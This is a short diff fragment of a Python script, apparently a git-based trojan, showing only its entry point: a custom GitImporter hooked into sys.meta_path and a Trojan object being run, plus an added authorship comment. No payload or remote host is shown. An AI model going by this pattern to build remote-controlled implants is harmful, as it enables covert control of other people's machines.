@@ -82,9 +82,13 @@ class GitImporter:
         return new_module
 
 
+
+
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
     trojan = Trojan('abc')
     trojan.run()
 
-    
+
+#  aki's development.   2022
+
